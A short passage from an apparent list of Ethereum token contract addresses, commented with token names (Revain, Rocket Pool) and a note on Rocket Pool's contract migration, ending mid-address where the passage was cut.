// 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c

// Revain (REV)
// Revain is a blockchain-based review platform for the crypto community. Revain's ultimate goal is to provide high-quality reviews on all global products and services using emerging technologies like blockchain and AI.
// 0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9

// Rocket Pool (RPL)
// 0xd33526068d116ce69f19a9ee46f0bd304f21a51f

// Rocket Pool (RPL)
// Token contract has migrated to 0xD33526068D116cE69F19A9ee46F0bd304F21A51f
// 0xb4efd85c19999d84251304bda99e90b92300